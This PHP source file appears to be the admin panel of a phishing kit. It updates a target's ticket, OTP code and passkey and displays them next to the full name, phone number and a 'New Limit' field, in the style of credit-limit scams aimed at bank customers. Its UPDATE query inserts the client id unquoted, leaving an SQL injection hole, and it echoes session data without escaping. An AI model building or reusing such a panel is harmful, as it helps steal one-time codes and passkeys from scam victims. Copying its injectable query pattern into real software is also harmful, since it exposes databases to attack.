<?php
	require "functionadmn.php";

	check_login();

	if($_SERVER['REQUEST_METHOD'] == "POST")
	{
		$ticket = addslashes ($_POST['ticket']);
		$code = addslashes ($_POST['code']);
		$passkey = addslashes ($_POST['passkey']);
		$clienid = addslashes ($_POST['clienid']);

		$query = "UPDATE `users` SET `ticket` = '$ticket',`code`='$code',`passkey`='$passkey' WHERE `users`.`id` = $clienid";

		$result = mysqli_query($con,$query);

		header("location: admin.php");
		die;
	}

	
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>client</title>
	<?php require "style.php";?>
</head>
<body>
	<article class="main-body">
		<div class="container">
			<section class="fpage">
				<form method="post">
			    	<table  class="table">
				        <thead>
						    <h2><span>details</span></h2>
					    </thead>
			        	<tbody>
				         	<tr class="tr">
				         		<th><span class="no-members">ID</span></th>
				         		<td colspan="3"><?php echo $_SESSION['info']['id']?></td>
				         	</tr>
				         	<tr class="tr">
				                <th><span class="no-members">FULL NAME</span></th>
				                <td><?php echo $_SESSION['info']['fullnames']?></td>
				            </tr>
				            <tr class="tr">
				                <th><span class="no-members">Phone Number</span></th>
				                <td><?php echo $_SESSION['info']['phoneNo']?></td>
				            </tr>
				         	<tr class="tr">
				         		<th><span class="no-members">Ticket Number</span></th>
				         		<td colspan="3"><?php echo $_SESSION['info']['ticket']?><br></td>
				         	</tr>
				         	<tr class="tr">
				         		<th><span class="no-members">New Limit</span></th>
				         		<td colspan="3"><?php echo $_SESSION['info']['nlimit']?><br></td>
				         	</tr>
				         	<tr class="tr">
				         		<th><span class="no-members">OTP Code</span></th>
				         		<td colspan="3"><?php echo $_SESSION['info']['code']?><br></td>
				         	</tr>
				         	<tr class="tr">
				         		<th><span class="no-members">passkey</span></th>
				         		<td colspan="3"><?php echo $_SESSION['info']['passkey']?><br></td>
				         	</tr>
			        	</tbody>
				    </table>
				    
				</form>
		    <div class="tfoot">
			    <a href="#" class="btn-btn-secondary"><span class="no-members">Back to top</span></a>
			    <a href="admin.php" class="buttons"><span class="no-members">Back</span></a>
			</div>
			</section>
		</div></article>
</body>
</html>